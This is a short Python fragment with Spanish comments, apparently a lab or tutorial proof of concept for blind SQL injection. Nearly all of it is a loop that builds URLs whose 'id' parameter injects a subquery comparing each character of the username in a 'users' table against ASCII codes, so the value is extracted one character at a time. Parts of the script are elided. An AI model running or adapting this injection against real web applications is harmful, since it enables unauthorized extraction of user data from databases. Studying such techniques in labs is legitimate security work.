...
"""
Script para obtener la primera prueba de concepto de obtención de información de la base de datos
"""
...
def makesqli():
    ...
    for position in range(1,50):
        for character in range(33,127): # 33 del código ascii hasta el valor 126 del código ascii
            sqli_url = main_url + "?id=15 or (select (select ascii(substring(username,%d,1)) from users where id=1) = %d)" % (position, character)
